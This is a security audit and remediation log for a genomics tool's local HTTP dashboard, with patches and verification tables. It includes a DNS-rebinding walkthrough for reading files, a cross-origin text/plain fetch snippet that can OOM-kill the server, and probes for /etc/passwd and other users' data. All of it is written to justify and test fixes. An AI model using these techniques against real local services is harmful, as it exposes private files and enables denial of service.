# cuttag_profiler — HTTP server & path confinement security audit

**Date:** 2026-08-15
**Scope:** `src/http_server.cpp`, `include/profiler/http_server.hpp`, `resolve_input_path`,
`--data-root` confinement, every untrusted HTTP input path, and the reachable
`bed_reader` / `bam_reader` sinks.
**Excluded:** `third_party/httplib` internals (vendored; see *Not reviewed*).

## Summary

Nine findings. The headline is not a path-traversal bug in `resolve_input_path` — that
function's confinement algorithm is, on inspection, **substantially correct when a root
is actually set**. The problem is that essentially nothing else around it is load-bearing:

- confinement is **off by default** (`data_root` defaults to empty, and empty means
  "no confinement"), so the shipped configuration has no sandbox at all; and
- the loopback bind that the design leans on as its security boundary is **not a
  boundary** — there is no authentication, no `Host` header validation and no CSRF
  defence, so any web page the operator visits can reach the API, and a DNS-rebinding
  page can read its responses.

Those two compose. The result is that a remote web page can read arbitrary files
through a server whose banner says `no data leaves this machine`.

This also **upgrades finding 2 from the previous review**: the unbounded-window
OOM-kill is not merely "remote if you bind non-loopback", it is reachable cross-origin
from any website against a default loopback install (see H3).

| # | Sev | Finding | Location | Status |
|---|---|---|---|---|
| H1 | **Critical** | No auth + no `Host` validation → DNS rebinding defeats loopback-only | `http_server.cpp:185-218` | **Fixed** — Host/Origin 2026-08-15, session token 2026-08-21 |
| H2 | **Critical** | `--data-root` empty by default ⇒ confinement disabled; arbitrary file access | `http_server.hpp:28`, `http_server.cpp:87` | **Fixed** |
| H3 | **High** | No CSRF defence; `/api/profile` accepts no-preflight cross-origin POST | `http_server.cpp:244-247` | **Fixed** |
| M4 | Medium | Error strings echo the raw path ⇒ filesystem existence/type oracle | `http_server.cpp:91-96` | **Fixed** |
| M5 | Medium | BED column 4 exfiltrates file content via `row_names` → `/api/matrix` | `bed_reader.cpp:123-124` | **Fixed** 2026-08-21 |
| M6 | Medium | TOCTOU between `resolve_input_path` and the actual `open` | `http_server.cpp:98` | **Fixed for region files; residual for BAM** 2026-08-21 |
| L7 | Low | `starts_with("..")` is a string test, not a component test | `http_server.cpp:90` | **Fixed** 2026-08-21 |
| L8 | Low | `std::system` command injection via `--host` under `--allow-remote` | `http_server.cpp:420-433` | **Fixed** 2026-08-21 |
| L9 | Low | Non-CSPRNG matrix tokens, compared non-constant-time | `http_server.cpp:40-44, 169-175` | **Fixed** 2026-08-21 |

> **Read the statuses before trusting the summary above.** All nine findings
> are now closed, with one stated residual: M6 is fully closed for region
> files, which read from the descriptor the confinement check was made
> against, and partly closed for BAMs, which htslib still opens by name
> because `sam_index_load` needs a path. See the 2026-08-21 log below for what
> that leaves open and what it does not.
>
> One control was added that this audit did not ask for, because it is the
> only answer to a question the audit's threat model does not cover: what
> happens when this binary runs somewhere the dashboard has no business
> existing. `-DPTO_CLOUD_BUILD=ON` compiles the server out entirely. See
> "Build-time exclusion" below.

## Remediation log (2026-08-15)

### H3 — closed

Three layered controls, all in `src/http_server.cpp` and
`include/profiler/http_security.hpp`:

1. A **pre-routing handler** scoped to `/api/`, so no endpoint can forget it.
2. **`Host` validation** (`host_header_is_local`) → HTTP 421. This is what
   defeats DNS rebinding: a rebound page still sends the attacker's hostname,
   because `Host` reflects the URL the page was loaded from, not the address it
   resolved to.
3. **`Origin` validation** (`origin_is_self`) → HTTP 403, plus a
   **`Content-Type: application/json`** gate on `POST /api/profile` → HTTP 415,
   which blocks the no-preflight `text/plain` CSRF shape directly.

`Origin` is checked for *mismatch*, not for presence. Browsers send `Origin` on
same-origin POSTs too, and the shipped dashboard's own `POST /api/profile`
carries `Origin: http://127.0.0.1:<port>`; rejecting every `Origin` would have
broken the UI while still looking like a working control.

API responses also gained `Cache-Control: no-store` and `X-Frame-Options: DENY`.

Verified against a live server:

| Request | Result |
|---|---|
| `Host: evil.example.com` | **421** |
| `Host: 127.0.0.1:<port>` / `localhost:<port>` | 200 |
| `Origin: http://evil.example.com` | **403** |
| `Origin: null` (sandboxed iframe) | **403** |
| `Origin: http://127.0.0.1:<port>` (dashboard) | 200 |
| `Content-Type: text/plain` POST | **415** |
| Full dashboard profile request | 200, 40 bins |
| `GET /` (static assets, exempt) | 200 |

Regression tests: `tests/test_http_security.cpp` (new CTest target
`http_security`), covering loopback names, IPv6 literals, port mismatch,
malformed values, and the substring/suffix tricks (`127.0.0.1.evil.com`,
`localhost.evil.com`) that a `find`-based comparison would have accepted.

### M4 — closed

`PathError` marks every failure whose message can embed a path or file content;
`as_path_error()` funnels the BED/GTF parser and htslib into it. All such
failures now collapse to **one message and one status code**:

```json
{"error":"the requested file could not be read; check the server log for the reason",
 "ref":"b22802-0"}
```

Collapsing matters as much as redacting — distinct replies are the oracle even
without a path in them. Verified: "outside root", "absent inside root" and
"present but wrong format" are now byte-identical apart from `ref`.

The detail is not lost. It goes to stderr, which only the operator sees:

```
[cuttag_profiler] request failed (ref b22802-0): path is outside the permitted data root: /etc/passwd
```

Parameter-validation messages (`bin size must be greater than zero`) are still
returned verbatim: they carry no filesystem information and are what makes the
API usable. The global exception handler was also sanitised — anything reaching
it escaped a handler's own `catch`, so its text is unaudited.

### H2 — closed

Confinement is now mandatory, and the check lives on `ServerOptions::validate()`
rather than in the argument parser, so a test, a library embedding or a future
second entry point cannot bypass it. `HttpServer`'s constructor calls it.

The core change is that **the unconfined state is no longer reachable by
omission**. An empty `data_root` used to *mean* "no confinement", so you got the
vulnerable configuration by not thinking about it — the worst possible ergonomics
for a security control. Running unconfined now requires `--no-confinement`,
which is greppable, visible in `ps`, and prints a boxed warning at startup.

`validate()` also rejects a `data_root` that does not exist or is not a
directory, and canonicalises it — an un-canonicalised root (a symlink, a
trailing `/.`, a relative path) would be compared against the canonicalised
*request* path and reject everything: fail-closed, but baffling to debug.

Refused combinations, all verified against the built binary:

| Invocation | Result |
|---|---|
| `serve` (no flags — the old default) | **error**, with the fix in the message |
| `--data-root /nope` | error: does not exist |
| `--data-root demo.bam` | error: not a directory |
| `--data-root D --no-confinement` | error: mutually exclusive |
| `--no-confinement --allow-remote` | **error** — refuses to publish an unauthenticated read to the network |
| `--no-confinement` | starts, boxed warning |
| `--data-root D` | starts; `/etc/passwd` → 400, in-jail file → 200 |
| `--data-root ./data` (relative) | starts; canonicalised, jail holds |

Regressions: `tests/test_http_security.cpp` → four `H2:` cases, pinning that a
default-constructed `ServerOptions` is rejected.

### Still open, and why it matters

- **H1(c)**, the session token, is not implemented. The header checks bind the
  browser threat model only; a hostile local process sets its own headers.
- **M5, M6, L7, L8, L9** are unchanged from the original assessment.

*(Superseded by the 2026-08-21 log below. Kept as written: the point of a
living record is that you can see what was true when, not a document that has
always claimed to be finished.)*

## Remediation log (2026-08-21)

Everything left open above, plus one control the audit did not call for.

### Build-time exclusion — `-DPTO_CLOUD_BUILD=ON`

Not a finding in this document, and the most important change in this pass.

Every control below makes the dashboard safe **for one operator on one
workstation**. None of them makes a listening port acceptable inside a
multi-tenant cloud worker, where the isolation boundary is one ephemeral task
per job and a socket inside that task is a way around it. `pto-cloud` knows
this — it refuses to dispatch `serve` in `api/app/job_specs.py` and again in
the dispatcher's `FORBIDDEN_SUBCOMMANDS` — but both are Python allowlists,
several deploys away from the binary, and neither is true of the artefact
itself.

`-DPTO_CLOUD_BUILD=ON` makes it true of the artefact. `src/http_server.cpp` is
not compiled, the vendored httplib and nlohmann headers are not linked, the
dashboard assets are not embedded, and `serve` is compiled out of `main.cpp`.
Measured on the built binaries:

| | default build | `PTO_CLOUD_BUILD=ON` |
|---|---|---|
| `nm \| grep -c httplib` | 800 | **0** |
| undefined `socket`/`bind`/`listen`/`accept` | all four present | **none** |
| binary size | 1 703 568 B | 1 025 248 B |
| `serve` | starts a server | exits 1 with an explanation |

Enforced three ways, because a flag that nobody sets guarantees nothing:

* `ctest -R server_linkage` runs `nm` over the linked binary and fails if the
  configuration and the artefact disagree — **in both directions**, so a stray
  `PTO_CLOUD_BUILD=ON` in a workstation build is caught as loudly as a missing
  one in a cloud build.
* `ctest -R cloud_no_server` (cloud configuration only) runs the binary and
  pins that `serve` exits non-zero, and that `--help` does not advertise a
  dashboard this build cannot run.
* `pto-cloud/worker/Dockerfile` sets the flag and then **asserts the property
  of the image it just built**, failing the build if `serve` is accepted. A
  flag can be dropped in a rebase; the assertion is what survives it.

### H1(c) — closed

`ServerOptions::require_token` (default **on**) mints a 256-bit token from the
platform CSPRNG in `HttpServer`'s constructor. The pre-routing handler
requires it on every `/api/` request, as `?t=` or as `Authorization: Bearer`,
compared with `constant_time_equals`. Static assets stay exempt: the dashboard
has to load before it can present anything.

The operator never types it. The startup banner prints — and `open_in_browser`
opens — a URL carrying `?t=<token>`; `web/index.html` reads it once from
`location.search`, keeps it in a module variable, and strips it back out of the
address bar with `history.replaceState` so it does not survive into a
screenshot or the browser history. Every `fetch` goes through one `api()`
helper, so a call that forgets the token gets a 401 rather than silently
working.

Turning it off is `--no-auth`, and `validate()` refuses to combine that with
`--allow-remote` — as it now also refuses `--no-confinement --allow-remote`,
which was previously enforced in `main.cpp` only and so was reachable by any
other caller. Both checks moved onto the type for the reason H2's did.

Verified against a live server (`--data-root`, ephemeral port):

| Request | Result |
|---|---|
| `GET /api/health`, no token | **401** |
| `?t=deadbeef` | **401** |
| `?t=<first 60 of 64 chars>` | **401** |
| `?t=<token>` | 200 |
| `Authorization: Bearer <token>` | 200 |
| `Host: evil.example.com` + valid token | **421** (Host check still first) |
| `Origin: http://evil.example.com` + valid token | **403** |
| `GET /` (static assets) | 200, no token needed |
| `GET /api/matrix?token=<matrix token>`, no session token | **401** |

What this does **not** do: the token is one shared secret for the run, so any
process that can read the operator's terminal, process table or browser
history has it. That is the intended bound — it raises the requirement from
"can send a TCP packet to loopback" to "can read the operator's session", and
the design's own answer to anything stronger is not to run the dashboard.

### M5 — closed

`sanitize_region_name` in `include/profiler/bed_reader.hpp` caps a name at 256
characters and replaces C0 controls and DEL with `?`. Applied at both sites
that produce one: BED column 4 in `read_bed`, and the attribute value in
`read_gtf`.

At the point of parse, not at the three points of output — `topRegions[].name`
in the `/api/profile` JSON, the first column of the `/api/matrix` TSV, and
`profile --out-matrix` — because sanitising at the sinks is the arrangement
that eventually misses one. It also means the fix covers the **batch** path,
which is what the cloud worker runs and which this audit's HTTP framing does
not cover: a tab or newline in a region name breaks the framing of a TSV a
downstream tool will parse as data, and that is a bug whether or not a server
is involved.

Two things deliberately not done. Names are not HTML-escaped: the dashboard
must not be relying on pre-escaped input, and escaping here would corrupt a
legitimate name containing `&`. And `read_regions` still dispatches on the
filename extension — the audit's own patch only added a comment there, and the
note is now in the header where a caller will see it.

While in the parsers, two coordinate checks that were missing: `read_bed` now
rejects a negative coordinate (`std::from_chars` parses `-5` happily, and it
used to reach the window arithmetic in `signal_calc`, where it is a quietly
wrong answer rather than a refusal), and `read_gtf` rejects `start < 1` rather
than turning GTF's 1-based coordinate 0 into a negative one.

### M6 — closed for region files; residual for BAM

`profiler::open_regular_file` (`src/safe_open.cpp`) performs **one** `open()`
with `O_RDONLY | O_CLOEXEC | O_NOFOLLOW | O_NONBLOCK` and asks every subsequent
question of the returned descriptor — `fstat`, then `S_ISREG` — rather than of
the name. `resolve_input` returns that descriptor alongside the canonical path.

For **region files the window is gone**: `read_regions_from_fd` hands the
descriptor to `bgzf_dopen`, so the bytes parsed are the bytes behind the
descriptor the confinement check was made against, and the name is never
resolved again.

For **BAMs it is narrowed, not gone**. `BamReader` still opens by name, because
`sam_index_load` resolves the `.bai` from a path and htslib hands out one file
handle per worker thread. What is closed for BAMs: the FIFO, the device node,
and a symlink final component, all rejected before htslib sees the file. What
remains: a name repointed at another *regular file inside the data root*
between `resolve_input` and `BamReader`'s open. Closing that means teaching
`BamReader` to work from a descriptor, which the index rules out today. Stated
here rather than described as fixed.

`O_NONBLOCK` is load-bearing rather than tuning: opening a FIFO `O_RDONLY`
blocks **in `open()` itself** until a writer appears, so without it the
function hangs on exactly the input the `S_ISREG` check exists to reject. It is
cleared with `fcntl` once the descriptor is known to be a regular file.

Benign symlinks still work, which matters — pipelines symlink data files
routinely. Confinement canonicalises first, so what reaches `O_NOFOLLOW` is
already a resolved path with no symlink final component; an in-root symlink to
an in-root file opens normally, and one pointing outside the root is rejected
by the containment check before the open is attempted. Both verified against a
live server.

Measured against a live server: a FIFO named as the regions file now returns
**400 in under a second** (it previously parked a pool thread until a writer
appeared, and httplib's pool is fixed-size, so a handful of those was a denial
of service reachable with confinement fully enabled).

### L7 — closed

`is_contained()` walks the components of the `fs::relative` result and rejects
any `..`, replacing the `starts_with("..")` string test. As the original
finding said, the string form was not exploitable — but it falsely *rejected* a
legitimate in-root file named `..archive.bed`, with an error claiming it was
outside the data root.

### L8 — closed

`std::system` is gone. `open_in_browser` uses `posix_spawnp` with an explicit
`argv` (`ShellExecuteA` on Windows), so nothing in the URL is ever parsed by a
shell, and a `posix_spawn_file_actions` object redirects the child's stdout and
stderr to `/dev/null` — the shell-free equivalent of the `>/dev/null 2>&1` that
was in the command string, and now also necessary because the URL carries the
session token.

`posix_spawnp` rather than `fork`+`exec`: by the time this runs the server has
threads, and between `fork` and `exec` only async-signal-safe calls are legal
in the child.

One correction to the original finding's exploitability, since the file is now
the record: the injection required a `--host` value that both contained a
single quote and **bound successfully**, because the URL is constructed after
`bind_to_port` returns. A hostile hostname generally fails to bind first. The
finding is still right that a shell had no business being there — especially if
serve options ever come from a config file or a wrapper.

### L9 — closed

`profiler::secure_token` (`src/secrets.cpp`) replaces the `mt19937_64` seeded
from one `random_device` call: `arc4random_buf` on macOS/BSD, `getrandom()`
with a `/dev/urandom` fallback on Linux, `BCryptGenRandom` on Windows, rendered
as **fixed-width** lowercase hex. The old `std::hex` formatting suppressed
leading zeros, so roughly one token in sixteen was short — the delivered
entropy was below what the code appeared to claim, and the length itself
carried information. It throws rather than degrading if the platform cannot
supply entropy: a server that comes up anyway is serving behind a predictable
secret.

`constant_time_equals` (`include/profiler/secrets.hpp`) accumulates the XOR of
every byte into a `volatile` accumulator. The `volatile` is not decoration —
without it a compiler may notice that the loop's only observable effect is the
final comparison and reintroduce the early exit, silently, at whatever
optimisation level the release build uses. Length is compared first and is not
hidden; every secret compared through it is minted at a fixed, public width.

`Impl::recall` uses it, and scans **every** cache entry rather than returning
at the first hit, so neither the length of a correct prefix nor the matching
entry's position in the cache is observable through timing.

### Regression tests added

| Suite | Covers | Runs in |
|---|---|---|
| `tests/test_secrets.cpp` | L9: fixed width, no stuck byte positions, no repeats, every single-byte difference caught, no prefix ever matches, embedded NUL handled | both configurations |
| `tests/test_region_names.cpp` | M5 (bound, control characters, wired into both parsers) and M6 (descriptor path equals name path, directory/missing/symlink/FIFO all refused) | both configurations |
| `tests/test_http_security.cpp` | H1c: token on by default, one per run, `--no-auth` mints nothing, `--allow-remote` refuses both `--no-auth` and `--no-confinement` | default only (needs `ServerOptions`) |
| `server_linkage`, `cloud_no_server*` | the build-time exclusion, asserted against the artefact | as noted above |

The first two run in the cloud configuration on purpose. The primitives they
cover are compiled into it, and a security test that quietly stops running in
the build that ships is worse than not having written it.

---

## H1. Critical — No authentication and no `Host` validation; DNS rebinding defeats loopback-only

`src/http_server.cpp:185-218`, `include/profiler/http_server.hpp:5-10`

### The claimed boundary

The header states the design's security model explicitly:

```
// Air-gap guarantees enforced here:
//   * the listener binds to a loopback address only (127.0.0.1 by default);
```

and `run()` enforces it (`:186-192`), refusing a non-loopback bind unless
`--allow-remote`. The banner printed at `:407` tells the operator
`no data leaves this machine`.

The outbound half of that claim is true and well built — assets are served from
rodata, and the CSP at `:204-207` is a genuinely good `default-src 'self'` with
`base-uri 'none'` and `form-action 'none'`. Nothing phones home.

**The inbound half does not hold.** Binding to 127.0.0.1 restricts which *network
interfaces* can reach the socket. It does not restrict which *web origins* can cause
the operator's own browser to issue requests to it. There is:

- no authentication on any endpoint (`/api/health`, `/api/chroms`, `/api/profile`, `/api/matrix`);
- no `Host` header allowlist;
- no `Origin` / `Referer` check;
- no CSRF token.

### Attack: DNS rebinding

1. The operator runs `cuttag_profiler serve` (binds `127.0.0.1:8080`) and, at any
   point while it runs, browses to `https://attacker.example`.
2. `attacker.example` resolves to the attacker's IP with a 1-second TTL. The page
   loads and starts polling.
3. The attacker flips the DNS record to `127.0.0.1`. The browser re-resolves.
4. The page's origin is *still* `http://attacker.example:8080` — so the browser
   considers subsequent requests **same-origin** — but the socket is now the
   profiler's. The same-origin policy is satisfied, so the page can **read every
   response body**.
5. The page issues `GET /api/chroms?bam=/home/victim/private/patient.bam`, then
   `POST /api/profile`, then `GET /api/matrix?token=...`, and exfiltrates the results
   to the attacker.

Nothing in the request is anomalous; the server has no way to tell this from the
legitimate dashboard because it never looks at who is asking. The `Host` header in
step 4 is `attacker.example:8080` — the single field that would expose the whole
attack, and it is never inspected.

Combined with H2 (no data root by default), step 4 reads **any file on the machine
the server's uid can open**.

### Why the CSP does not help

The CSP at `:204-207` is attached only to the static-asset responses, and CSP governs
what *the profiler's own pages* may load. It places no constraint on a third-party
origin making requests *to* the profiler. It is the right header for what it does and
irrelevant to this attack.

### Patch

Two independent controls: a `Host` allowlist (kills rebinding) and a bearer token
(kills everything else, including a same-machine hostile process). Both belong in a
pre-routing handler so no endpoint can forget them.

```diff
--- a/modules/cuttag_profiler/include/profiler/http_server.hpp
+++ b/modules/cuttag_profiler/include/profiler/http_server.hpp
@@ -23,6 +23,7 @@ struct ServerOptions {
 struct ServerOptions {
     std::string host = "127.0.0.1";
     int port = 8080;
     std::string data_root;
     bool open_browser = true;
     bool loopback_only = true;
+    // When true (default) the server mints a session token at startup and
+    // requires it on every /api/ request. The dashboard URL carries it, so the
+    // operator never types it. --no-auth disables it for scripted local use.
+    bool require_token = true;
 };
```

```diff
--- a/modules/cuttag_profiler/src/http_server.cpp
+++ b/modules/cuttag_profiler/src/http_server.cpp
@@
+// Constant-time comparison, so a token cannot be recovered a byte at a time by
+// timing the reply.
+bool secret_equals(std::string_view a, std::string_view b) noexcept {
+    if (a.size() != b.size()) return false;
+    unsigned char diff = 0;
+    for (std::size_t i = 0; i < a.size(); ++i) {
+        diff |= static_cast<unsigned char>(a[i]) ^ static_cast<unsigned char>(b[i]);
+    }
+    return diff == 0;
+}
+
+// A Host header the browser would only send if it believed it was talking to
+// this loopback service under the name we bound. Rejecting anything else is
+// what defeats DNS rebinding: the rebound page keeps sending the attacker's
+// hostname in Host even after the address flips to 127.0.0.1.
+bool host_header_is_local(std::string_view host, int port) {
+    // Strip the port, tolerating a bracketed IPv6 literal.
+    std::string_view name = host;
+    if (!name.empty() && name.front() == '[') {
+        const auto close = name.find(']');
+        if (close == std::string_view::npos) return false;
+        const std::string_view rest = name.substr(close + 1);
+        if (!rest.empty() && rest != ":" + std::to_string(port)) return false;
+        name = name.substr(1, close - 1);
+    } else if (const auto colon = name.rfind(':'); colon != std::string_view::npos) {
+        if (name.substr(colon + 1) != std::to_string(port)) return false;
+        name = name.substr(0, colon);
+    }
+    return name == "127.0.0.1" || name == "localhost" || name == "::1";
+}
```

Install it before the routes are registered in `run()`:

```diff
@@ void HttpServer::run() {
     auto& server = impl_->server;
 
+    // Every /api/ request passes here first. The static assets are exempt:
+    // they are public, non-sensitive rodata, and the dashboard must load
+    // before it can present a token.
+    server.set_pre_routing_handler(
+        [this](const httplib::Request& req, httplib::Response& res) {
+            if (req.path.rfind("/api/", 0) != 0) {
+                return httplib::Server::HandlerResponse::Unhandled;
+            }
+
+            // (a) Anti-DNS-rebinding. A rebound page still carries the
+            // attacker's hostname in Host, so this is the field that exposes it.
+            if (options_.loopback_only &&
+                !host_header_is_local(req.get_header_value("Host"), bound_port_)) {
+                res.status = 421;  // Misdirected Request
+                res.set_content(json{{"error", "unrecognised Host header"}}.dump(),
+                                "application/json");
+                return httplib::Server::HandlerResponse::Handled;
+            }
+
+            // (b) Anti-CSRF. A cross-origin page cannot suppress Origin, and a
+            // same-origin fetch from our own dashboard does not send one.
+            if (const std::string origin = req.get_header_value("Origin");
+                !origin.empty()) {
+                res.status = 403;
+                res.set_content(json{{"error", "cross-origin requests are refused"}}.dump(),
+                                "application/json");
+                return httplib::Server::HandlerResponse::Handled;
+            }
+
+            // (c) Session token: also stops a hostile local process on a shared box.
+            if (options_.require_token) {
+                std::string presented = req.get_param_value("t");
+                if (presented.empty()) {
+                    std::string_view auth = req.get_header_value("Authorization");
+                    if (auth.rfind("Bearer ", 0) == 0) presented = auth.substr(7);
+                }
+                if (!secret_equals(presented, session_token_)) {
+                    res.status = 401;
+                    res.set_content(json{{"error", "missing or invalid session token"}}.dump(),
+                                    "application/json");
+                    return httplib::Server::HandlerResponse::Handled;
+                }
+            }
+            return httplib::Server::HandlerResponse::Unhandled;
+        });
```

Mint the token before binding and put it in the URL that is printed and opened:

```diff
+    if (options_.require_token && session_token_.empty()) {
+        session_token_ = secure_token();   // see L9
+    }
@@
     const std::string url =
-        "http://" + options_.host + ":" + std::to_string(bound_port_) + "/";
+        "http://" + options_.host + ":" + std::to_string(bound_port_) + "/" +
+        (options_.require_token ? "?t=" + session_token_ : "");
```

The dashboard JS must forward `t` on its API calls — read it once from
`location.search` and append it, about four lines in `web/index.html`.

Also add `Cache-Control: no-store` and `X-Frame-Options: DENY` to API responses so a
token-bearing URL is not retained in a shared cache and the dashboard cannot be framed.

Finally, correct the two overstated claims once the controls are in:

```diff
-//   * the listener binds to a loopback address only (127.0.0.1 by default);
+//   * the listener binds to a loopback address only (127.0.0.1 by default), and
+//     API requests additionally require a local Host header, no Origin, and the
+//     session token -- a loopback bind alone does NOT keep a hostile web page
+//     out, because the operator's own browser can reach 127.0.0.1 and a
+//     DNS-rebinding page can read the replies.
```

---

## H2. Critical — Confinement is disabled by default

`include/profiler/http_server.hpp:28`, `src/http_server.cpp:79-99`, `src/main.cpp:271`

### What is wrong

`resolve_input_path` opens with:

```cpp
// Rejects a path that escapes `root` once symlinks and `..` are resolved. An
// empty root disables confinement (single-user workstation default).
```

and implements it at `:87`:

```cpp
if (!root.empty()) {
    ...confinement...
}
```

`ServerOptions::data_root` is a default-constructed `std::string` — **empty**.
`--data-root` is optional (`main.cpp:271`) and the usage text at `main.cpp:64` lists no
default. So the shipped, documented invocation —

```
cuttag_profiler serve
```

— runs with the `if (!root.empty())` block skipped entirely. Every path check that
follows is `fs::exists()`.

### Consequence

Any absolute path is accepted:

```
GET /api/chroms?bam=/home/other-user/cohort/patient_042.bam
POST /api/profile   {"bam":"/srv/shared/restricted.bam","regions":"/tmp/mine.bed"}
```

The first returns the full contig list and mapped-read count of a BAM the requester
may have no business reading; the second returns computed signal over it, plus a
`token` that streams the whole matrix from `/api/matrix`. On a shared analysis server
this is straightforward cross-user data access. Under H1 it is *remote* arbitrary
file access.

The "single-user workstation" assumption in the comment is doing a lot of load-bearing
work for a default, and it is not stated anywhere the operator will see it — not in
`--help`, not in the banner.

### Why "fail open" is the wrong default here

Note the asymmetry: an operator who *wants* confinement must know to ask for it, and
gets no warning if they forget. An operator who genuinely wants the whole filesystem
is making a deliberate choice and can say so. The default should be the safe one.

### Patch

Default the root to the current working directory, make "no confinement" an explicit
opt-in, and make the disabled state loud.

```diff
--- a/modules/cuttag_profiler/include/profiler/http_server.hpp
+++ b/modules/cuttag_profiler/include/profiler/http_server.hpp
@@
-    // Root directory the file browser is confined to. Requests that escape it
-    // after canonicalisation are rejected.
-    std::string data_root;
+    // Root directory file access is confined to. Requests that escape it after
+    // canonicalisation are rejected. Defaults to the working directory at
+    // startup; `--data-root /` opts out deliberately and prints a warning.
+    // Never leave this empty: an empty root disables confinement entirely.
+    std::string data_root;
```

```diff
--- a/modules/cuttag_profiler/src/main.cpp
+++ b/modules/cuttag_profiler/src/main.cpp
@@ int run_serve(int argc, char** argv) {
@@
     }
 
+    // Confine to the working directory unless told otherwise. Previously this
+    // defaulted to empty, and empty means "no confinement" -- so the documented
+    // `cuttag_profiler serve` invocation served the entire filesystem.
+    if (options.data_root.empty()) {
+        std::error_code ec;
+        options.data_root = std::filesystem::current_path(ec).string();
+        if (ec) {
+            throw std::runtime_error(
+                "cannot determine the working directory for --data-root; "
+                "pass --data-root explicitly");
+        }
+        std::fprintf(stderr, "confining file access to %s (override with --data-root)\n",
+                     options.data_root.c_str());
+    }
```

And make the escape hatch honest rather than accidental:

```diff
--- a/modules/cuttag_profiler/src/http_server.cpp
+++ b/modules/cuttag_profiler/src/http_server.cpp
@@
 std::string resolve_input_path(const std::string& raw, const std::string& root) {
     if (raw.empty()) throw std::invalid_argument("empty path");
+    // An empty root would disable confinement. That is never a legitimate
+    // configuration reached by accident: main.cpp defaults it to the working
+    // directory, so an empty value here means a caller constructed
+    // ServerOptions directly and forgot. Fail closed rather than serve /.
+    if (root.empty()) {
+        throw std::logic_error(
+            "resolve_input_path: no data root configured; refusing to resolve '" +
+            raw + "' against an unconfined filesystem");
+    }
     std::error_code ec;
```

Update `--help` (`main.cpp:64`) to state the default:

```
  --data-root DIR          confine file access to DIR  [working directory]
```

---

## H3. High — No CSRF defence; `/api/profile` takes a no-preflight cross-origin POST

`src/http_server.cpp:244-247`

### What is wrong

The handler parses the body unconditionally:

```cpp
server.Post("/api/profile", [this](const httplib::Request& req, httplib::Response& res) {
    try {
        const json request = json::parse(req.body);
```

There is no `Content-Type` check, no `Origin` check, and no CSRF token. A page on any
origin can therefore issue:

```js
fetch("http://127.0.0.1:8080/api/profile", {
  method: "POST",
  mode: "no-cors",
  headers: { "Content-Type": "text/plain" },   // CORS-safelisted -> NO preflight
  body: JSON.stringify({ bam: "...", regions: "...", upstream: 2000000000,
                         downstream: 2000000000 })
});
```

`text/plain` is a CORS-safelisted request content type, so **no preflight is sent** and
the request reaches the handler. `json::parse` does not care what the `Content-Type`
said. The attacker cannot *read* the response without H1's rebinding trick — but the
side effect has already happened.

### Why this matters beyond CSRF

This is the delivery vector for **finding 2 of the previous review** (the unbounded
window → up-front `regions × 80,000,000 × sizeof(double)` allocation → OOM SIGKILL).
That finding was written up as "remote and unauthenticated", scoped to whoever can
reach the port. This narrows nothing and widens the reach: with a default loopback
bind and no `--allow-remote`, **any web page the operator visits can kill the server
process**, and with a plausible `bam`/`regions` guess (`data/demo.bam` relative paths
resolve against CWD) it can do so blind.

The two fixes are complementary and both are needed: H1's `Origin` rejection stops the
request arriving, and the previous review's `ProfileOptions::validate()` stops the
allocation if it ever does.

### Patch

Covered by H1's pre-routing handler — the `Origin` rejection at (b) and the token at
(c) both block this. Add a belt-and-braces content-type check in the handler so the
endpoint is not silently permissive if the pre-routing handler is ever reordered:

```diff
     server.Post("/api/profile", [this](const httplib::Request& req,
                                        httplib::Response& res) {
         try {
+            // Require a non-safelisted content type. A cross-origin page can
+            // only send application/json by first passing a CORS preflight,
+            // which we never answer -- so this alone blocks the no-preflight
+            // text/plain CSRF shape above.
+            if (req.get_header_value("Content-Type").rfind("application/json", 0) != 0) {
+                res.status = 415;
+                res.set_content(json{{"error", "Content-Type must be application/json"}}.dump(),
+                                "application/json");
+                return;
+            }
             const json request = json::parse(req.body);
```

Also cap the request body; `json::parse` on a multi-gigabyte body is its own DoS:

```diff
+    server.set_payload_max_length(1024 * 1024);  // 1 MiB; requests are small JSON
```

---

## M4. Medium — Error messages echo the raw path, giving a filesystem oracle

`src/http_server.cpp:91-96`, and the sinks at `bed_reader.cpp:23,108,117,120`

`resolve_input_path` returns four distinguishable outcomes, all reflected verbatim to
the caller by the `catch` blocks at `:238-241` and `:347-350`:

| Probe outcome | Response body |
|---|---|
| outside the root | `path is outside the permitted data root: <raw>` |
| inside root, absent | `no such file: <raw>` |
| present, unreadable/not BGZF | `cannot open region file: <path>` |
| present, readable, not BED | `<path>:1: BED requires at least 3 columns` |
| present, readable, BED-ish | `<path>:7: non-numeric coordinate` |

That is a complete existence-and-type oracle for every path the server's uid can
`stat`, at roughly one HTTP request per probe. Even with H2 fixed (confinement on),
the first two rows still let an attacker enumerate the layout *inside* the data root,
and the last two disclose file format and the line number at which parsing failed —
enough to infer a fair amount about a file the attacker cannot read directly.

The parse errors also echo the resolved absolute path, which discloses the data root's
real location on disk (post-symlink), useful for planning M6.

### Patch

Log the detail locally; return a single opaque message.

```diff
 std::string resolve_input_path(const std::string& raw, const std::string& root) {
@@
     if (!root.empty()) {
         const fs::path root_path = fs::weakly_canonical(fs::path(root), ec);
         const auto rel = fs::relative(candidate, root_path, ec);
         if (ec || rel.empty() || !is_contained(rel)) {
-            throw std::invalid_argument("path is outside the permitted data root: " +
-                                        raw);
+            // One message for every rejection reason. Distinguishing "outside
+            // the root" from "does not exist" turns this endpoint into a
+            // filesystem existence oracle.
+            std::fprintf(stderr, "rejected path outside data root: %s\n", raw.c_str());
+            throw std::invalid_argument("requested file is not available");
         }
     }
     if (!fs::exists(candidate)) {
-        throw std::invalid_argument("no such file: " + raw);
+        std::fprintf(stderr, "no such file: %s\n", raw.c_str());
+        throw std::invalid_argument("requested file is not available");
     }
```

And stop reflecting parser detail. In both `catch` blocks, distinguish errors the
client is allowed to see (its own malformed JSON, out-of-range options) from errors
about the filesystem. The cheapest correct form is a dedicated exception type:

```cpp
// Thrown for anything the client may safely be told. Everything else becomes a
// generic message with the detail written to the server log only.
struct ClientError : std::invalid_argument { using std::invalid_argument::invalid_argument; };
```

```diff
-        } catch (const std::exception& error) {
-            res.status = 400;
-            res.set_content(json{{"error", error.what()}}.dump(), "application/json");
-        }
+        } catch (const ClientError& error) {
+            res.status = 400;
+            res.set_content(json{{"error", error.what()}}.dump(), "application/json");
+        } catch (const std::exception& error) {
+            std::fprintf(stderr, "/api/profile failed: %s\n", error.what());
+            res.status = 400;
+            res.set_content(json{{"error", "request failed"}}.dump(), "application/json");
+        }
```

Note the same reflection exists in the global exception handler at `:380-391`, which
returns `error.what()` with status 500 — that one can surface internal state from
anywhere in the profiler core. Give it the same treatment.

---
